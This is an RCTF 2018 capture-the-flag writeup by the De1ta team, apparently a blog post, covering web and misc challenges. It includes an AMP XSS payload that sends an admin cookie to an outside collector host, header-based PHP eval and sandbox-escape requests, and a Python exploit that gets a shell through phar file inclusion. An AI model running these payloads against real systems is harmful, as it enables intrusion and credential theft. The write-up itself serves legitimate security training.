<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="RCTF 2018 Writeup">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>RCTF 2018 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2018/05/22/RCTF-2018-Writeup/">
                RCTF 2018 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-05-22</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="De1ta-Team"><a href="#De1ta-Team" class="headerlink" title=" De1ta-Team"></a> <strong>De1ta-Team</strong></h1><a id="more"></a>
<blockquote>
<p>Team：De1ta</p>
</blockquote>
<h2 id="0x00-Web"><a href="#0x00-Web" class="headerlink" title="0x00 Web"></a>0x00 Web</h2><h3 id="AMP"><a href="#AMP" class="headerlink" title="AMP"></a><strong>AMP</strong></h3><p>由cookie提示flag在admin的cookie 应该是xss</p>
<p>post后会log</p>
<p>应该和amp标准有关 : <a href="https://zh.wikipedia.org/zh-hans/Accelerated_Mobile_Pages" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/Accelerated_Mobile_Pages</a></p>
<p>AMP规范 : <a href="https://www.ampproject.org/zh_cn/docs/fundamentals/spec" target="_blank" rel="noopener">https://www.ampproject.org/zh_cn/docs/fundamentals/spec</a></p>
<p>猜测使用AMP特性绕过csp打到cookie</p>
<p>AMP获取cookies的方法：<a href="https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id" target="_blank" rel="noopener">https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id</a></p>
<p>网页源码里有句注释：</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/760ee8a7498c23022ab69809be19f350.png?raw=true" alt></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;amp-pixel src=&quot;https://487a72b5.2m1.pw/?cid=CLIENT_ID(FLAG)&quot;&gt;&lt;/amp-pixel&gt;</span><br><span class="line"></span><br><span class="line">&lt;amp-user-notification</span><br><span class="line">    layout=nodisplay</span><br><span class="line">    id=&quot;FLAG&quot;</span><br><span class="line">    data-show-if-href=&quot;https://487a72b5.2m1.pw&quot;</span><br><span class="line">    data-dismiss-href=&quot;https://487a72b5.2m1.pw&quot;&gt;</span><br><span class="line">    This site uses cookies to personalize content.</span><br><span class="line">    &lt; a href=&quot;&quot;&gt;Learn more.&lt;/ a&gt;</span><br><span class="line">   &lt;button on=&quot;tap:user-consent.dismiss&quot;&gt;I accept&lt;/button&gt;</span><br><span class="line">&lt;/amp-user-notification&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Client ID is not provided until `user-consent` is dismissed --&gt;</span><br><span class="line">&lt;amp-pixel src=&quot;https://487a72b5.2m1.pw/?cid=CLIENT_ID(FLAG,FLAG)&quot;&gt;&lt;/amp-pixel&gt;</span><br></pre></td></tr></table></figure>
<p>url编码后在浏览器触发</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/a26beb18454f4b40d6bd8391dae8d5a1.png?raw=true" alt></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/97c5792c45546fe10532ccf70f935943.png?raw=true" alt></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/84dd60c8ffb92776a7f112d911c36d08.png?raw=true" alt></p>
<p>flag: <strong>RCTF{El_PsY_CONGRO0_sg0}</strong></p>
<h3 id="r-cursive"><a href="#r-cursive" class="headerlink" title="r-cursive"></a><strong>r-cursive</strong></h3><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/78ad9d62e5596eb6437600cdc75d8ff0.png?raw=true" alt></p>
<p>访问后在../sandbox/生成一个sha1文件夹，然后复制模板进去，提供了重定向到该文件夹和重置文件夹的功能</p>
<p>重定向后是个php沙箱，只能执行格式为`xxxx();`的函数</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/ffda1904ef97da4ac5b93ffae77fa012.png?raw=true" alt></p>
<p>可以递归执行函数，不允许带参数</p>
<p>?cmd=print(readdir(opendir(getcwd()))); 可以列目录</p>
<p>?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</p>
<p>?cmd=print(dirname(dirname(getcwd()))); print出/var/www</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/889f9bb358752e2f517d7eb81c180ea4.png?raw=true" alt></p>
<p>翻阅文档找到`getallheaders()`函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了</p>
<p>?cmd=print(implode(getallheaders()));</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/7b3e433d271b2b45cae7a14a0f6550b7.png?raw=true" alt><br>命令执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: phpinfo(); //</span><br><span class="line">Host: 39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox.r-cursive.ml</span><br></pre></td></tr></table></figure></p>
<p>接下来沙盒逃逸，从phpinfo看，这里是开了mod_vhost_alias</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/b3f8d9fc78e8b40f8e02552ff83787bd.png?raw=true" alt></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/74ed6f2b957dd1d98e94d086ced9f666.png?raw=true" alt></p>
<p>这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/3a3e13992efd1293cc6e1ab93e8c1572.png?raw=true" alt></p>
<p>所以这里通过修改host来逃逸沙盒的open_basedir。</p>
<ol>
<li>正常的open_basedir:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&apos;open_basedir&apos;);//</span><br><span class="line">Host: 39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox.r-cursive.ml</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/0f08b6d227e6337fead817c1a75e10a6.png?raw=true" alt></p>
<ol start="2">
<li>把host头的39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox去掉：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&apos;open_basedir&apos;);//</span><br><span class="line">Host: .r-cursive.ml</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/d41f6a1b0ac52577813f63286f1af623.png?raw=true" alt></p>
<p>403是因为webroot没有index.php，正好说明已经逃逸出了沙盒</p>
<p>所以去访问39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php 即可调用命令</p>
<ol start="3">
<li>借用39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php来执行命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&apos;open_basedir&apos;);//</span><br><span class="line">Host:  .r-cursive.ml</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/5d6fb4e3487f7aa4cc3a876e82a39320.png?raw=true" alt></p>
<ol start="4">
<li>拿到flag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&apos;open_basedir&apos;);$myfile=fopen(&apos;/var/www/sandbox/init.php&apos;,&apos;r&apos;);echo fread($myfile,9999);//</span><br><span class="line">Host:  .r-cursive.ml</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/d5d703f98cdee96a54d3036d6f9f6950.png?raw=true" alt></p>
<h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a><strong>backdoor</strong></h3><p>题目的附件在RE 的complier</p>
<p>解压出来是一个archlinux的ISO,直接扔进vmware启动就行</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/05685d7633fa0a02851757688308b94f.png?raw=true" alt></p>
<p>/root文件夹下有helloworld.c和wallpaper.jpg两个文件，图片提取出来一个no_hint.txt：</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/6d5451c2628949500e6e02b755e23ba0.png?raw=true" alt></p>
<p>用wireshark抓取虚拟机用gcc编译时的流量，发现会从<a href="http://backdoor.2018.teamrois.cn/control.sh" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/control.sh</a><br>下载了一个bash脚本：</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/4eba6e0f66030a74c25104d69c3c4600.png?raw=true" alt></p>
<p>该脚本的主要工作为：</p>
<blockquote>
<ol>
<li>检测是否有wireshark|tshark|idaq|strace|gdb|edb|lldb|lida|hopper|r2|radare2进程，如果有，就向<a href="http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers发送“Oh" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers发送“Oh</a>,      no! He’s debugging! I’ll kill them!!!!!!”，并杀死相关进程；</li>
<li>执行head -c100000 /dev/urandom  &gt; /tmp/random.txt 命令，将/tmp/random.txt打包为zip并发送给<a href="http://backdoor.2018.teamrois.cn/post.php?action=upload" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/post.php?action=upload</a></li>
<li>echo “Did you find the backdoor?” &gt; ~/rctf-backdoor.txt</li>
</ol>
</blockquote>
<p>访问<a href="http://backdoor.2018.teamrois.cn/" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/</a>：</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/1d44043e8848151b3ec1306810a3f0e4.png?raw=true" alt></p>
<p>查看源代码，有一段aaencode</p>
<p>解码得到到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.loginform.onsubmit = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; </span><br><span class="line">	e.preventDefault()</span><br><span class="line">	<span class="built_in">document</span>.getElementById(<span class="string">'wp-submit'</span>).disabled = <span class="string">'disabled'</span></span><br><span class="line">	setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementById(<span class="string">'wp-submit'</span>).removeAttribute(<span class="string">'disabled'</span>)</span><br><span class="line">		alert(<span class="string">'Login failed'</span>)</span><br><span class="line">		<span class="string">"What? Need hint?"</span></span><br><span class="line">		<span class="string">"index.php is a hint!"</span></span><br><span class="line">	&#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>意识到这个登陆页没啥用</p>
<p>在<a href="http://backdoor.2018.teamrois.cn/post.php?action=upload" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/post.php?action=upload</a><br>寻找突破口，发现可以文件读取</p>
<p>读post.php源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=post</span><br></pre></td></tr></table></figure>
<p>post.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'action'</span>] . <span class="string">'.php'</span>;</span><br></pre></td></tr></table></figure>
<p>读upload.php源码</p>
<p><a href="http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload</a></p>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) <span class="keyword">exit</span>;</span><br><span class="line">$file = $_FILES[<span class="string">'file'</span>];</span><br><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">true</span> !== $zip-&gt;open($file[<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'No a valid zip'</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === $zip-&gt;getFromName(<span class="string">'tmp/random.txt'</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'No file'</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dest = <span class="string">'uploads/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . hash(<span class="string">'sha256'</span>, file_get_contents($file[<span class="string">'tmp_name'</span>])) . <span class="string">'.zip'</span>;</span><br><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], $dest);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Saved into '</span> . $dest;</span><br></pre></td></tr></table></figure>
<p>post.php存在限制后缀的文件包含，可以通过phar://或者zip://协议绕过，从而包含恶意代码getshell，upload.php中限制了上传的文件要是个zip并且里面要有个random.txt文件，最终构造exp如下</p>
<p>exp.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s1 = <span class="string">"Saved into "</span></span><br><span class="line">post_url = <span class="string">"http://backdoor.2018.teamrois.cn/post.php?action=upload"</span></span><br><span class="line"></span><br><span class="line">zip_file = open(<span class="string">"tmp.zip"</span>,<span class="string">"rb"</span>)</span><br><span class="line">upload_file = &#123;<span class="string">'file'</span>:zip_file&#125;</span><br><span class="line">r = requests.post(post_url,files=upload_file)</span><br><span class="line">dest = r.text[len(s1):]</span><br><span class="line">print(dest)</span><br><span class="line"></span><br><span class="line">shell_url = <span class="string">"http://backdoor.2018.teamrois.cn/post.php?action=phar://"</span>+ dest + <span class="string">"/evil"</span></span><br><span class="line"></span><br><span class="line">print(shell_url)</span><br><span class="line">command = input(<span class="string">"command: "</span>)</span><br><span class="line">payload = &#123;<span class="string">'chybeta'</span>: <span class="string">'system("cat flag_HIDINGANDSEEKlol.php");'</span>&#125;</span><br><span class="line">r = requests.get(shell_url,params=payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<h2 id="0x01-Misc"><a href="#0x01-Misc" class="headerlink" title="0x01 Misc"></a>0x01 Misc</h2><h3 id="sign"><a href="#sign" class="headerlink" title="sign"></a><strong>sign</strong></h3><p>elf文件，binwalk一下有发现，binwalk提取出其中的png文件，是这样的：</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/78f44c6ceef4210e4e54652aeecddc48.png?raw=true" alt></p>
<p>提示wine</p>
<p>用wine运行getflag：</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/86ffcf812287db1c3f9149940ca62976.png?raw=true" alt></p>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a><strong>git</strong></h3><p>给了个git文件夹，估计flag是藏在提交历史里，</p>
<p>getflag：</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/9b5eb04927e849c1bd6fbd2feddfb683.png?raw=true" alt></p>
<h3 id="cats"><a href="#cats" class="headerlink" title="cats"></a><strong>cats</strong></h3><p>题目要求找出15个命令xxx，使得xxx food的输出结果等于cat food的输出结果</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/eb3e5cd84262f334aaeee23d7cf61631.png?raw=true" alt></p>
<p>在本地docker测试可以免掉验证码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'food'</span>&gt;yourCatFood</span><br><span class="line">docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro rctf_cats bash -c <span class="string">"timeout 5 diff -Z &lt;(cat food) &lt;(xxxx food)"</span></span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/9c75906c72bcf8c128c1eb2cfd3e9985.png?raw=true" alt></p>
<p>后来想到把food内容也设置为`food`，这样cat food就等于ls food等于echo<br>food了，用这种方法找出15个可用的命令，然后拿到flag</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/296f3fd8e9eb37e77a139e777661c73b.png?raw=true" alt></p>
<h3 id="cats-Rev-2"><a href="#cats-Rev-2" class="headerlink" title="cats Rev.2"></a><strong>cats Rev.2</strong></h3><p>在1的基础上</p>
<p>If you can find at least 4 out of 5 cats whose names in (python3, bash, php,<br>node, ruby), I will give you another flag ._.</p>
<p>看来就是命令绕过了，1中只用到了php</p>
<p>一开始陷入误区，打算用软链接来替换掉命令</p>
<p>如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"ln -s /bin/cat /usr/local/sbin/gg"</span>)</span><br><span class="line">f=open(<span class="string">'food'</span>,<span class="string">'r'</span>)</span><br><span class="line">data=f.read()</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>提交python3,gg,…..</p>
<p>但是，后来发现应该是将所有cat的名字分别代入到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro</span><br><span class="line">rctf_cats bash -c <span class="string">"timeout 5 diff -Z \&lt;(cat food) \&lt;(yourCatName food)"</span></span><br></pre></td></tr></table></figure>
<p>所以，每个环境都是独立的，相互不影响，所以需要写一个脚本是（python3,bash,node,ruby）中3个运行输出与cat一样的（php只要不写”\&lt;?php”，直接原样输出）。</p>
<p>跟cat一致，那就是读取文件内容并输出了。</p>
<p>python3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(open(<span class="string">'food'</span>).read());</span><br></pre></td></tr></table></figure>
<p>ruby</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(open(<span class="string">'food'</span>).read());</span><br></pre></td></tr></table></figure>
<p>bash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat food</span><br></pre></td></tr></table></figure>
<p>node</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fs=require(&apos;fs&apos;);</span><br><span class="line">var data=fs.readFileSync(&apos;food&apos;,&apos;utf-8&apos;);</span><br><span class="line">console.log(data);</span><br></pre></td></tr></table></figure>
<p>接下来是考虑整合了。</p>
<p>通过解析的差异和适当的exit来整合。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> cat food;</span><br></pre></td></tr></table></figure>
<p>在bash下输出文件内容，在ruby、node下无输出</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(open(<span class="string">'food'</span>).read());</span><br></pre></td></tr></table></figure>
<p>ruby运行OK，node运行报函数未定义，so，定义下函数</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function print(data)&#123;</span><br><span class="line">fs=<span class="keyword">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">var data=fs.readFileSync(<span class="string">'food'</span>,<span class="string">'utf-8'</span>);</span><br><span class="line">console.log(data);</span><br><span class="line">&#125;</span><br><span class="line">function open(filename)&#123;<span class="keyword">return</span> &#123;<span class="symbol">read:</span>function()&#123;&#125;&#125;&#125;</span><br><span class="line">function exit()&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>所以，结合起来</p>
<p>本地测试的时候，node是要去掉后面的回车<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> cat food;</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">exit</span>;</span><br><span class="line"><span class="built_in">print</span>(open(<span class="string">'food'</span>).<span class="built_in">read</span>());<span class="built_in">exit</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">print</span>(data)&#123;</span><br><span class="line">fs=require(<span class="string">'fs'</span>);</span><br><span class="line">var data=fs.readFileSync(<span class="string">'food'</span>,<span class="string">'utf-8'</span>);</span><br><span class="line">console.log(data.slice(0,-1));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> open(filename)&#123;<span class="built_in">return</span> &#123;<span class="built_in">read</span>:<span class="function"><span class="title">function</span></span>()&#123;&#125;&#125;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">exit</span></span>()&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是，答题那里不用去掉末尾的回车，要改成<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> cat food;</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">exit</span>;</span><br><span class="line"><span class="built_in">print</span>(open(<span class="string">'food'</span>).<span class="built_in">read</span>());<span class="built_in">exit</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">print</span>(data)&#123;</span><br><span class="line">fs=require(<span class="string">'fs'</span>);</span><br><span class="line">var data=fs.readFileSync(<span class="string">'food'</span>,<span class="string">'utf-8'</span>);</span><br><span class="line">console.log(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> open(filename)&#123;<span class="built_in">return</span> &#123;<span class="built_in">read</span>:<span class="function"><span class="title">function</span></span>()&#123;&#125;&#125;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">exit</span></span>()&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/57aebfb432b41b85d1894f00d6063487.png?raw=true" alt></p>
<h3 id="Number-Game"><a href="#Number-Game" class="headerlink" title="Number Game"></a><strong>Number Game</strong></h3><p>  o__ <strong>o             o</strong> <strong>o    __</strong>o__ <strong>o__</strong>   o__ <strong>o</strong>/_</p>
<p> &lt;|     v\           /v     v\    /   \   /   \   &lt;|    v</p>
<p> / \     &lt;\         /&gt;       &lt;\        \o/        &lt; &gt;</p>
<p> \o/     o/       o/                    |          |</p>
<p>  |<strong>  _&lt;|       &lt;|                    &lt; &gt;         o</strong>/_</p>
<p>  |       \       \                    |          |</p>
<p> <o>       \o       \         /         o         <o></o></o></p>
<p>  |         v\       o       o         &lt;|          |</p>
<p> / \         &lt;\      &lt;__ __/&gt;         / \        / \</p>
<p>In every round of the game, I’ll choose some different numbers from the figure<br>interval. You are required to guess those numbers,ofc so does the order of them.</p>
<p>On each surmise of yours, 2 numbers will be told as a hint for you, but you need<br>to speculate the fuctions of these 2 figures. (XD</p>
<p>GLHF</p>
<p>================== round 1 ==================</p>
